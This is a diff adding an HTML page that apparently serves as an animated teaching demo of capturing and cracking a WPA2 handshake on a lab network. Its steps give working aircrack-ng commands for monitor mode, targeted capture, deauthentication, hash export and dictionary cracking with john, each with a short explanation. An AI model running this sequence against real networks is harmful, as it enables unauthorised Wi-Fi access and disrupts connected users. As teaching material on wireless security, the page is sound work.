@@ -1,0 +1,214 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WPA2 handshake capture — animated demo</title>
+<style>
+  :root{
+    --ink:#1f2430;--muted:#5b6473;--line:#e2e6ec;--accent:#0550ae;
+    --client:#534ab7;--ap:#1d9e75;--atk:#c0392b;
+    --termbg:#0e1116;--tprompt:#3fb950;--tcmd:#e6edf3;--tflag:#d2a8ff;--tval:#ffa657;--tfile:#7ee787;--tcmt:#8b949e;--thi:#f0c674;--tok:#56d364;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{margin:0;background:#eef1f5;color:var(--ink);overflow:hidden;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;}
+  .wrap{width:100%;max-width:1000px;height:100vh;display:flex;flex-direction:column;padding:4px 18px 8px;gap:5px;}
+  .top{flex:0 0 auto;display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;}
+  h1{font-size:18px;margin:0;font-weight:650;}
+  .step-tag{font-size:13px;color:#fff;background:var(--accent);border-radius:20px;padding:2px 10px;font-weight:600;}
+  .diagram{flex:0 0 auto;width:100%;aspect-ratio:680 / 168;min-height:0;display:flex;align-items:center;justify-content:center;}
+  .diagram svg{width:100%;height:100%;}
+  .spacer{flex:1 1 auto;min-height:0;}
+  .th{font-size:13px;font-weight:600;fill:var(--ink)} .ts{font-size:11.5px;fill:var(--muted)} .m{font-family:"SFMono-Regular",Menlo,Consolas,monospace;font-size:11px}
+  .hide{opacity:0;transition:opacity .35s} .show{opacity:1;transition:opacity .35s}
+  .term{flex:0 0 auto;min-height:0;max-height:38vh;overflow:auto;background:var(--termbg);border-radius:10px;padding:11px 16px;
+    font-family:"SFMono-Regular",Menlo,Consolas,"Liberation Mono",monospace;font-size:18px;line-height:1.5;}
+  .term .ln{white-space:pre-wrap;overflow-wrap:anywhere;}
+  .p{color:var(--tprompt);font-weight:700} .c{color:var(--tcmd);font-weight:700} .f{color:var(--tflag)} .v{color:var(--tval)} .fi{color:var(--tfile)} .k{color:var(--tcmt);font-style:italic} .hi{color:var(--thi);font-weight:700} .okc{color:var(--tok);font-weight:700} .o{color:#c9d1d9}
+  .cmt{flex:0 0 auto;font-size:18.5px;line-height:1.45;color:var(--ink);background:#fff;border:1px solid var(--line);border-radius:10px;padding:10px 15px;}
+  .cmt b{color:var(--accent)}
+  .ctrl{flex:0 0 auto;display:flex;align-items:center;gap:12px;}
+  .btn{font:inherit;font-size:15px;padding:7px 16px;border:1px solid #b4b2a9;background:#fff;color:var(--ink);border-radius:8px;cursor:pointer}
+  .btn:hover{border-color:var(--ink)} .btn:disabled{opacity:.4;cursor:default}
+  .btn.play{background:var(--accent);color:#fff;border-color:var(--accent)}
+  .dots{display:flex;gap:7px;flex:1;justify-content:center}
+  .dot{width:10px;height:10px;border-radius:50%;background:#b4b2a9;border:0;padding:0;cursor:pointer}
+  .dot.on{background:var(--accent)}
+  @media (prefers-reduced-motion: no-preference){
+    .flow{stroke-dasharray:5 5;animation:fl 1.1s linear infinite} @keyframes fl{to{stroke-dashoffset:-20}}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="top"><h1>WPA2 handshake capture — live demo</h1><span class="step-tag" id="tag">Step 0</span></div>
+
+  <div class="diagram">
+  <svg viewBox="0 16 680 168" preserveAspectRatio="xMidYMid meet" role="img" aria-label="Client, access point and attacker with AR9271 adapter">
+    <defs>
+      <marker id="ar" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M1 1 L9 5 L1 9 z" fill="#5b6473"/></marker>
+      <marker id="arR" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M1 1 L9 5 L1 9 z" fill="#c0392b"/></marker>
+      <marker id="arT" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M1 1 L9 5 L1 9 z" fill="#1d9e75"/></marker>
+    </defs>
+
+    <!-- Wi-Fi link client<->AP -->
+    <line id="link" x1="132" y1="62" x2="296" y2="56" stroke="#1d9e75" stroke-width="2" stroke-dasharray="5 5"/>
+    <text class="ts" x="214" y="44" text-anchor="middle">Wi-Fi (WPA2)</text>
+
+    <!-- handshake arrows -->
+    <g id="hs" class="hide">
+      <line x1="140" y1="74" x2="292" y2="68" stroke="#f0a73a" stroke-width="2.4" marker-end="url(#arT)"/>
+      <line x1="292" y1="82" x2="140" y2="88" stroke="#f0a73a" stroke-width="2.4" marker-end="url(#arT)"/>
+      <text class="ts" x="214" y="104" text-anchor="middle" style="fill:#a85d00">4-way handshake</text>
+    </g>
+
+    <!-- CLIENT (phone) -->
+    <g>
+      <rect x="70" y="30" width="40" height="64" rx="7" fill="#EEEDFE" stroke="#534ab7" stroke-width="1.8"/>
+      <rect x="76" y="38" width="28" height="44" rx="2" fill="#CECBF6"/>
+      <circle cx="90" cy="88" r="2.4" fill="#534ab7"/>
+    </g>
+    <text class="th" x="90" y="128" text-anchor="middle">Client</text>
+    <text class="ts m" x="90" y="144" text-anchor="middle">phone · 10.0.0.5</text>
+
+    <!-- AP (router) -->
+    <g>
+      <path d="M312 22 q28 -20 56 0" fill="none" stroke="#9FE1CB" stroke-width="2"/>
+      <path d="M322 30 q18 -12 36 0" fill="none" stroke="#5DCAA5" stroke-width="2"/>
+      <rect x="308" y="38" width="64" height="28" rx="7" fill="#E1F5EE" stroke="#1d9e75" stroke-width="1.8"/>
+      <line x1="326" y1="38" x2="322" y2="26" stroke="#1d9e75" stroke-width="1.6"/>
+      <line x1="354" y1="38" x2="358" y2="26" stroke="#1d9e75" stroke-width="1.6"/>
+      <circle cx="340" cy="52" r="3" fill="#1d9e75"/>
+    </g>
+    <text class="th" x="340" y="128" text-anchor="middle">Access point</text>
+    <text class="ts m" x="340" y="144" text-anchor="middle">MDX-Lab · ch 6</text>
+
+    <!-- ATTACKER laptop + AR9271 adapter -->
+    <g>
+      <!-- adapter -->
+      <rect id="adapter" x="482" y="52" width="50" height="22" rx="4" fill="#FBECEC" stroke="#c0392b" stroke-width="1.8"/>
+      <line x1="507" y1="52" x2="507" y2="42" stroke="#c0392b" stroke-width="1.6"/><circle cx="507" cy="40" r="2.5" fill="#c0392b"/>
+      <text class="ts m" x="507" y="67" text-anchor="middle" style="fill:#8a1f1f">AR9271</text>
+      <line x1="532" y1="63" x2="558" y2="70" stroke="#c0392b" stroke-width="1.6"/>
+      <!-- laptop + hat -->
+      <ellipse cx="600" cy="48" rx="20" ry="4.5" fill="#1C1C1C"/>
+      <path d="M591 48 L609 48 L606 37 L594 37 Z" fill="#1C1C1C"/>
+      <rect x="575" y="54" width="50" height="34" rx="3" fill="#FBECEC" stroke="#c0392b" stroke-width="1.8"/>
+      <rect x="580" y="59" width="40" height="24" fill="#F6D7D7"/>
+      <polygon points="567,96 633,96 640,104 560,104" fill="#F6D7D7" stroke="#c0392b" stroke-width="1.6"/>
+    </g>
+    <text class="th" x="598" y="128" text-anchor="middle" style="fill:#c0392b">Attacker (Kali)</text>
+    <text class="ts m" x="598" y="144" text-anchor="middle">mode: <tspan id="mode" style="fill:#8a1f1f;font-weight:700">managed</tspan></text>
+
+    <!-- capture/sniff line adapter->AP -->
+    <line id="listen" class="hide" x1="486" y1="60" x2="378" y2="54" stroke="#5b6473" stroke-width="2" stroke-dasharray="4 4" marker-end="url(#ar)"/>
+    <text id="listenT" class="ts hide" x="432" y="40" text-anchor="middle">capturing…</text>
+
+    <!-- deauth curve adapter->client (dips below AP) -->
+    <path id="deauth" class="hide flow" d="M500,82 Q312,236 120,100" fill="none" stroke="#c0392b" stroke-width="2.6" marker-end="url(#arR)"/>
+    <text id="deauthT" class="ts hide" x="312" y="180" text-anchor="middle" style="fill:#a32d2d;font-weight:700">deauth → client forced to reconnect</text>
+
+    <!-- badges -->
+    <g id="capBadge" class="hide"><rect x="520" y="150" width="150" height="26" rx="13" fill="#eafaf1" stroke="#1d9e75" stroke-width="1.2"/>
+      <text x="595" y="167" text-anchor="middle" style="font-size:13px;font-weight:700;fill:#0f6e56">✓ handshake captured</text></g>
+    <g id="keyBadge" class="hide"><rect x="238" y="154" width="204" height="28" rx="14" fill="#FAEEDA" stroke="#BA7517" stroke-width="1.4"/>
+      <text x="340" y="173" text-anchor="middle" class="m" style="font-size:14px;font-weight:700;fill:#633806">KEY FOUND: MiddleSex123</text></g>
+  </svg>
+  </div>
+
+  <div class="term" id="term"></div>
+  <div class="cmt" id="cmt"></div>
+  <div class="ctrl">
+    <button class="btn" id="prev">Prev</button>
+    <button class="btn play" id="play">▶ Auto</button>
+    <div class="dots" id="dots"></div>
+    <button class="btn" id="next">Next</button>
+  </div>
+  <div class="spacer"></div>
+</div>
+<script>
+(function(){
+  var L=function(h){return '<div class="ln">'+h+'</div>';};
+  var steps=[
+    {tag:"0 · detect adapter",mode:"managed",show:[],
+     term:[L('<span class="p">$</span> <span class="c">iw</span> <span class="o">dev</span>'),
+           L('<span class="o">    Interface </span><span class="v">wlan0</span>'),
+           L('<span class="o">        type </span><span class="o">managed</span>')],
+     cmt:'<b>iw dev</b> — confirm the AR9271 is attached and seen as <b>wlan0</b> in normal (managed) mode. Nothing is captured yet.'},
+
+    {tag:"1 · monitor mode",mode:"monitor",show:[],
+     term:[L('<span class="p">$</span> <span class="c">sudo</span> <span class="o">airmon-ng check kill</span>'),
+           L('<span class="p">$</span> <span class="c">sudo</span> <span class="o">airmon-ng start</span> <span class="v">wlan0</span>'),
+           L('<span class="o">    (mac80211 monitor mode enabled on </span><span class="hi">wlan0mon</span><span class="o">)</span>')],
+     cmt:'<b>airmon-ng</b> stops interfering services and switches the adapter to <b>monitor mode</b> (<span class="o">wlan0mon</span>) — now it can hear every nearby frame.'},
+
+    {tag:"2 · find the AP",mode:"monitor",show:["listen","listenT"],
+     term:[L('<span class="p">$</span> <span class="c">sudo</span> <span class="o">airodump-ng</span> <span class="v">wlan0mon</span>'),
+           L('<span class="o">  BSSID              CH  ENC   ESSID</span>'),
+           L('<span class="hi">  C8:3A:35:AA:BB:CC   6  WPA2  MDX-Lab</span>')],
+     cmt:'<b>airodump-ng</b> scans the air and lists access points. Note the target’s <b>BSSID</b> and <b>channel</b> (MDX-Lab, ch 6), then stop.'},
+
+    {tag:"3 · targeted capture",mode:"monitor",show:["listen","listenT"],
+     term:[L('<span class="p">$</span> <span class="c">sudo</span> <span class="o">airodump-ng</span> <span class="f">-w</span> <span class="fi">capture</span> <span class="f">-c</span> <span class="v">6</span> <span class="f">--bssid</span> <span class="v">C8:3A:35:AA:BB:CC</span> <span class="v">wlan0mon</span>'),
+           L('<span class="o"> CH 6 ][ Elapsed: 12 s ][ </span><span class="k">                         </span>'),
+           L('<span class="k"> └ top-right still empty — no handshake yet</span>')],
+     cmt:'Now record only the target to <span class="o">capture-01.cap</span>. We must wait for a client to join — so we’ll <b>make</b> one rejoin.'},
+
+    {tag:"4 · deauth",mode:"monitor",show:["listen","deauth","deauthT"],drop:true,
+     term:[L('<span class="p">$</span> <span class="c">sudo</span> <span class="o">aireplay-ng</span> <span class="f">--deauth</span> <span class="v">10</span> <span class="f">-a</span> <span class="v">C8:3A:35:AA:BB:CC</span> <span class="v">wlan0mon</span>'),
+           L('<span class="o"> Sending 64 directed DeAuth — BSSID: [C8:3A:35:AA:BB:CC]</span>'),
+           L('<span class="o"> STMAC: [10:F6:0A:DE:23:B2]  ...</span>')],
+     cmt:'<b>aireplay-ng --deauth</b> forges disconnect frames. Wi-Fi management frames aren’t authenticated, so the phone obeys, drops, and then reconnects — which is exactly when the handshake happens.'},
+
+    {tag:"5 · handshake caught",mode:"monitor",show:["listen","hs","capBadge"],
+     term:[L('<span class="o"> CH 6 ][ Elapsed: 2 min ][ </span><span class="okc">WPA handshake: C8:3A:35:AA:BB:CC</span>'),
+           L('<span class="k"> └ the phone re-joined; the 4-way handshake was recorded</span>')],
+     cmt:'As the phone reconnects it performs the <b>4-way handshake</b>. airodump catches it — see <span class="okc">WPA handshake</span> top-right. Stop with Ctrl-C.'},
+
+    {tag:"6 · export the hash",mode:"managed",show:["hs","capBadge"],
+     term:[L('<span class="p">$</span> <span class="c">sudo</span> <span class="o">airmon-ng stop</span> <span class="v">wlan0mon</span>   <span class="k"># back to managed</span>'),
+           L('<span class="p">$</span> <span class="c">wpapcap2john</span> <span class="fi">capture-01.cap</span> <span class="v">&gt;</span> <span class="fi">wpa_hash.txt</span>'),
+           L('<span class="o"> MDX-Lab:$WPAPSK$MDX-Lab#</span><span class="k">…(base64 handshake)…</span>')],
+     cmt:'<b>wpapcap2john</b> turns the captured handshake into a <b>hash key file</b> John can read — the passphrase is never in it, only a verifier to test guesses against.'},
+
+    {tag:"7 · crack it",mode:"managed",show:["hs","capBadge","keyBadge"],
+     term:[L('<span class="p">$</span> <span class="c">john</span> <span class="f">--format=</span><span class="v">wpapsk</span> <span class="f">--wordlist=</span><span class="fi">rockyou.txt</span> <span class="fi">wpa_hash.txt</span>'),
+           L('<span class="okc"> MiddleSex123</span><span class="o">     (MDX-Lab)</span>'),
+           L('<span class="o"> 1g 0:00:00:03 DONE  — </span><span class="okc">KEY FOUND: MiddleSex123</span>')],
+     cmt:'<b>john</b> hashes each wordlist guess with <span class="o">PBKDF2(guess, SSID)</span> and compares to the captured handshake. A weak passphrase falls in seconds — a long random one would not.'}
+  ];
+  var all=["listen","listenT","deauth","deauthT","hs","capBadge","keyBadge"];
+  var n=steps.length,i=0,timer=null;
+  var term=document.getElementById("term"),cmt=document.getElementById("cmt"),tag=document.getElementById("tag"),
+      mode=document.getElementById("mode"),dots=document.getElementById("dots"),link=document.getElementById("link");
+  for(var k=0;k<n;k++){(function(k){var b=document.createElement("button");b.className="dot";b.onclick=function(){stop();i=k;render();};dots.appendChild(b);})(k);}
+  function render(){
+    var s=steps[i];
+    all.forEach(function(id){var e=document.getElementById(id);var on=s.show.indexOf(id)>=0;e.classList.toggle("show",on);e.classList.toggle("hide",!on);});
+    mode.textContent=s.mode; mode.style.fill=s.mode==="monitor"?"#a32d2d":"#8a1f1f";
+    link.setAttribute("opacity", s.drop?"0.25":"1");
+    term.innerHTML=s.term.join(""); cmt.innerHTML=s.cmt; tag.textContent="Step "+s.tag;
+    for(var k=0;k<n;k++)dots.children[k].classList.toggle("on",k===i);
+    document.getElementById("prev").disabled=(i===0&&!timer);
+    document.getElementById("next").disabled=(i===n-1&&!timer);
+    term.scrollTop=0;
+  }
+  function stop(){if(timer){clearInterval(timer);timer=null;document.getElementById("play").textContent="▶ Auto";}}
+  document.getElementById("prev").onclick=function(){stop();if(i>0){i--;render();}};
+  document.getElementById("next").onclick=function(){stop();if(i<n-1){i++;render();}};
+  document.getElementById("play").onclick=function(){
+    if(timer){stop();return;}
+    document.getElementById("play").textContent="⏸ Pause";
+    if(i===n-1){i=0;render();}
+    timer=setInterval(function(){ if(i<n-1){i++;render();} else {stop();render();} },3800);
+  };
+  document.addEventListener("keydown",function(e){
+    if(e.key==="ArrowRight"){stop();if(i<n-1){i++;render();}e.preventDefault();}
+    if(e.key==="ArrowLeft"){stop();if(i>0){i--;render();}e.preventDefault();}});
+  render();
+})();
+</script>
+</body>
+</html>
